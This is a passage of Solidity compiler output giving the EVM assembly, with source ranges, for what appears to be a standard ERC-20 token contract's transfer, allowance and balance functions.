											"begin": 2036,
											"end": 2192,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "AND"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMPDEST"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MLOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ISZERO"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MSTORE"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "ADD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "MLOAD"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "DUP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SUB"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP1"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "RETURN"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MLOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MSTORE"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "ADD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "MLOAD"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "DUP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SUB"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP1"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "RETURN"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2601,
											"end": 2605,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 2627,
											"end": 2637,
											"name": "CALLER"
										},
										{
											"begin": 2639,
											"end": 2646,
											"name": "DUP5"
										},
										{
											"begin": 2648,
											"end": 2653,
											"name": "DUP5"
										},
										{
											"begin": 2618,
											"end": 2626,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "JUMPDEST"
										},
										{
											"begin": 2672,
											"end": 2676,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2665,
											"end": 2676,
											"name": "SWAP1"
										},
										{
											"begin": 2665,
											"end": 2676,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1603,
											"end": 1610,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1630,
											"end": 1642,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 1630,
											"end": 1642,
											"name": "SLOAD"
										},
										{
											"begin": 1623,
											"end": 1642,
											"name": "SWAP1"
										},
										{
											"begin": 1623,
											"end": 1642,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3244,
											"end": 3248,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "PUSH [tag]",
											"value": "40"
										},
										{
											"begin": 3271,
											"end": 3277,
											"name": "DUP5"
										},
										{
											"begin": 3279,
											"end": 3288,
											"name": "DUP5"
										},
										{
											"begin": 3290,
											"end": 3296,
											"name": "DUP5"
										},
										{
											"begin": 3261,
											"end": 3270,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "tag",
											"value": "40"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "JUMPDEST"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 3317,
											"end": 3323,
											"name": "DUP5"
										},
										{
											"begin": 3325,
											"end": 3335,
											"name": "CALLER"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 3373,
											"end": 3379,
											"name": "DUP6"
										},
										{
											"begin": 3337,
											"end": 3348,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3349,
											"end": 3355,
											"name": "DUP11"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "KECCAK256"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3357,
											"end": 3367,
											"name": "CALLER"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "KECCAK256"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "SLOAD"
										},
										{
											"begin": 3337,
											"end": 3372,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 3337,
											"end": 3372,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "SWAP2"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "tag",
											"value": "43"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "JUMPDEST"
										},
										{
											"begin": 3308,
											"end": 3316,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "JUMPDEST"
										},
										{
											"begin": 3399,
											"end": 3403,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3392,
											"end": 3403,
											"name": "SWAP1"
										},
										{
											"begin": 3392,
											"end": 3403,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP4"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3900,
											"end": 3904,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3917,
											"end": 3996,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 3926,
											"end": 3936,
											"name": "CALLER"
										},
										{
											"begin": 3938,
											"end": 3945,
											"name": "DUP5"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 3984,
											"end": 3994,
											"name": "DUP6"
										},
										{
											"begin": 3947,
											"end": 3958,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3959,
											"end": 3969,
											"name": "CALLER"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "AND"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "AND"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "DUP2"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "MSTORE"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "ADD"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "SWAP1"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "DUP2"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "MSTORE"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "ADD"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3947,
											"end": 3970,
											"name": "KECCAK256"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3971,
											"end": 3978,
											"name": "DUP10"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "AND"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "AND"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "DUP2"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "MSTORE"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "ADD"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "SWAP1"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "DUP2"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "MSTORE"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "ADD"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "KECCAK256"
										},
										{
											"begin": 3947,
											"end": 3979,
											"name": "SLOAD"
										},
										{
											"begin": 3947,
											"end": 3983,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 3947,
											"end": 3983,
											"name": "SWAP1"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "SWAP2"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "SWAP1"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "AND"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "JUMPDEST"
										},
										{
											"begin": 3917,
											"end": 3925,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 3917,
											"end": 3996,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3917,
											"end": 3996,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 3917,
											"end": 3996,
											"name": "JUMPDEST"
										},
										{
											"begin": 4014,
											"end": 4018,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4007,
											"end": 4018,
											"name": "SWAP1"
										},
										{
											"begin": 4007,
											"end": 4018,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1770,
											"end": 1777,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1806,
											"name": "DUP1"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1814,
											"name": "DUP4"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "AND"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "AND"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "DUP2"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "MSTORE"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "ADD"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "SWAP1"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "DUP2"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "MSTORE"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "ADD"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "KECCAK256"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "SLOAD"
										},
										{
											"begin": 1790,
											"end": 1815,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1815,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4614,
											"end": 4618,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 4640,
											"end": 4650,
											"name": "CALLER"
										},
										{
											"begin": 4652,
											"end": 4659,
											"name": "DUP5"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "PUSH [tag]",
											"value": "52"
										},
										{
											"begin": 4698,
											"end": 4713,
											"name": "DUP6"
										},
										{
											"begin": 4661,
											"end": 4672,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4673,
											"end": 4683,
											"name": "CALLER"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "KECCAK256"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4685,
											"end": 4692,
											"name": "DUP10"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "DUP2"
										},
										{
